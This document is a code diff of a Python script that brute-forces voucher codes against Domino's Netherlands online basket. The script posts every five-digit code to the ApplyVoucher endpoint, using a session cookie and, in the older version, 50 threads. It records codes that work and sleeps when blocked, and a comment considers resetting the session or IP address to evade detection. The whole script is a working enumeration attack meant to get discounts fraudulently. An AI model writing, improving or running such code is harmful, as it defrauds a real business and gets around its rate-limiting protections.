@@ -1,73 +1,74 @@
+import time
+import random
 import requests
-from lxml import etree
-from Queue import Queue
-from threading import Thread
 
-speed = 50 #Vroom vroom
-sessionid = 'jvfzolrbzeutw3dlsohlgghp'
+sessionid = ''
 basket = "https://bestellen.dominos.nl/eStore/nl/Basket/"
-queue = Queue(speed*3)
+cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
+checkurl = "https://bestellen.dominos.nl/eStore/nl/Basket/GetBasketView?#"
 
+class PizzaBoy:
 
-def checkvalue(value, url, sessionid):
-    cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
-    testurl = "https://bestellen.dominos.nl/eStore/nl/Basket/GetBasketView?#"
-    r = requests.get(testurl, cookies=cookies)
-    html = etree.HTML(r.text)
-    text = html.xpath("//text()")
-    text = [i.strip() for i in text if len(i.strip()) > 2]
-    removecode(cookies)
-    return text[1]
+    def __init__(self, runid):
+        self.runid = runid
+        self.name = random.choice(['Donatello', 'Leonardo', 'Michelangelo', 'Rafael'])
+        self.greet()
 
+    def greet(self):
+        print("Hello, my name is {0}. I am your Pizza Boy".format(self.name))
 
-def sendcode(url, sessionid):
-    cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
-    r = requests.post(url, cookies=cookies)
-    response = r.text
-    if (r.status_code!=200):
-        print('Error/Denied/Other stuff you don\'t want, quitting...')
-    if '{"Url":null,"Messages":null}' in response:
-        return True
+    def run(self):
+        print("Checking codes")
+        for code in range(0, 99999):
+            code = self.adapt_code(code) if code < 10000 else str(code)
+            self.try_code(code)
 
+    def adapt_code(self, code):
+        codestring = str(code)
+        prefix = '0' * (5 - len(codestring))
+        return prefix + codestring
 
-def removecode(cookies):
-    removeurl1 = basket + "RemoveVoucher?orderItemId=1&timestamp=1405537142120"
-    removeurl2 = basket + "RemoveVoucher?orderItemId=2&timestamp=1405537142120"
-    removeurl3 = basket + "RemoveVoucher?orderItemId=1&timestamp=1405537142130"
-    removeurl4 = basket + "RemoveVoucher?orderItemId=2&timestamp=1405537142130"
-    requests.post(removeurl1, cookies=cookies)
-    requests.post(removeurl2, cookies=cookies)
-    requests.post(removeurl3, cookies=cookies)
-    requests.post(removeurl4, cookies=cookies)
+    def try_code(self, code):
+        url = basket + "ApplyVoucher?voucherCode=" + str(code)
+        result = self.send_code(url)
+        if (result):
+            discount = self.get_discount_from_code(code)
+            self.remove_code_from_basket();
+            self.remember_code_and_discount(code, discount)
+            self.say_code_and_discount(code, discount)
 
+    def send_code(self, url):
+        cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
+        r = requests.post(url, cookies=cookies)
+        response = r.text
 
-def exe(code, sessionid):
-    url = basket + "ApplyVoucher?voucherCode="+str(code)
-    result = sendcode(url, sessionid)
-    if(result):
-        value = checkvalue(len(code), url, sessionid)
-        print("Code:{0}\tWaarde:{1}".format(code, value))
+        if (r.status_code!=200):
+            self.go_to_sleep(3600)
+            return False
 
+        return '{"Url":null,"Messages":null}' in response
 
-def run():
-    while True:
-        code = queue.get()
-        #To debug
-        #print("Checking {}".format(code))
-        exe(code, sessionid)
-        queue.task_done()
+    def get_discount_from_code(self, code):
+        return 'discount'
 
+    def remove_code_from_basket(self):
+        pass
+
+    def go_to_sleep(self, seconds):
+        #todo: maybe reset the session id, or even ip
+        time.sleep(seconds)
+
+    def remember_code_and_discount(self, code, discount):
+        with open('codes{0}.txt'.format(self.runid), 'w') as file:
+            file.write('code: {0}\tdiscount: {1}\n'.format(code, discount))
+
+    def say_code_and_discount(self, code, discount):
+        print('code: {0}\tdiscount: {1}'.format(code, discount))
 
 def main():
-    #make workers
-    for i in range(speed):
-        thread = Thread(target=run)
-        thread.deamon = True
-        thread.start()
-    #add urls for workers
-    for code in range(40000, 50000):
-        queue.put(code)
-    queue.join()
+    runid = 0 #todo: increment run id
+    pb = PizzaBoy(runid)
+    pb.run()
 
-
-main()
+if __name__ == '__main__':
+    main()
